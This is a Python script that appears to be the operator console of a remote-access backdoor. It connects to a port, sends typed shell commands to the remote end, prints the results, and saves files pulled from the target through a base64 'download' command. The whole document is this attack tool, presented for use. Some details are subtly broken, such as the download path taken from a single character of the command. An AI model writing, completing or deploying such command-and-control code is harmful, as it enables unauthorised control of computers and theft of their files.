#!/usr/bin/env python3

import os
import sys
import base64
import socket
import datetime

class Listener:

    def __init__(self, host:str, port:int):
        # Starting Connection
        while ConnectionRefusedError:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((host, port))
                break
            except ConnectionRefusedError:
                continue
            
    def write_file(self, path, content):
        with open(path, "wb") as f:
            f.write(base64.b64decode(content))
            print("info: Download Successful")

    def start(self):
        while True:
            command = input(f"(cmd) ")
            self.sock.send(command.encode("latin1"))
            data = self.sock.recv(1024).decode("latin1")
            try:
                if command.lower().startswith("exit"):
                    self.sock.close()
                    sys.exit(1)
                elif command.lower().split(" ")[0] == "download":
                    self.write_file(command[1], data)          
                else:
                    print(data)
            except (BrokenPipeError, ConnectionResetError):
                print("info: Connection stoped by the target!")
                print("info: Exiting...")
                sys.exit(1)
                
if __name__ == '__main__':
    ct = datetime.datetime.now().strftime("%c")
    print(ct)

    lstnr = Listener("0.0.0.0", 9091)
    lstnr.start()